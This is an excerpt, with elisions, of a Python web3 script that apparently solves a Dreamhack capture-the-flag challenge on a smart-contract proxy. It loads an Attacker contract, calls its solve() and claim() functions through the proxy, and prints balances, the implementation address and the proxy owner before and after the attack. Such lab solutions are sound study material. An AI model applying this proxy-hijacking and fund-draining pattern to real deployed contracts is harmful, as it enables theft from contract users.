...
# 문제에서 사용하는 각종 정보 추출
MAIN_URL = "http://host3.dreamhack.games:8589"
...
with open("./sc-my-first-proxy-contract/src/Attacker.sol", "r") as f:
...
IMPL_ABI = contract_interface['abi']

web3 = Web3(Web3.HTTPProvider(RPC_URL))

current_file = os.path.abspath(__file__)

BASE_DIR = os.path.dirname(current_file) + "/sc-my-first-proxy-contract"
...
logic = web3.eth.contract(abi=IMPL_ABI, address=CONTRACT_ADDRESS)
logic_attack = web3.eth.contract(abi=ATTACKER_ABI, address=CONTRACT_ADDRESS)
...
print(f"Current user's balance: {USER_BALANCE / 1e18}")
print(f"Current contract's balance: {CONTRACT_BALANCE / 1e18}")

'''
CURRENT_VALUE = logic.functions.currentValue().call()

print(f"KingofDreamhackV2's currentValue: {CURRENT_VALUE}")
'''

tx = attacker.functions.solve().build_transaction({
    "from": USER_ADDRESS,
...
'''
PROXY_OWNER = contract.functions.proxyOwner().call()

print(f"Proxy Owner Address: {PROXY_OWNER}")
'''
...
print(f"After user's balance: {USER_BALANCE / 1e18}")
print(f"After contract's balance: {CONTRACT_BALANCE / 1e18}")
print(f"Implementation address after attack: {IMPL_ADDRESS}")
print(f"Attacker address: {ATTACKER_ADDRESS}")

tx = logic_attack.functions.claim().build_transaction({
    "from": USER_ADDRESS,
    "gasPrice": web3.to_wei(0.0000001, "ether"),
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
})
...
VULN = logic_attack.functions.vuln().call()
DUMMY = logic_attack.functions.dummy().call()
CONTRACT_OWNER = contract.functions.proxyOwner().call()

print(f"vuln address: {VULN}")
print(f"dummy address: {DUMMY}")
print(f"user address: {USER_ADDRESS}")
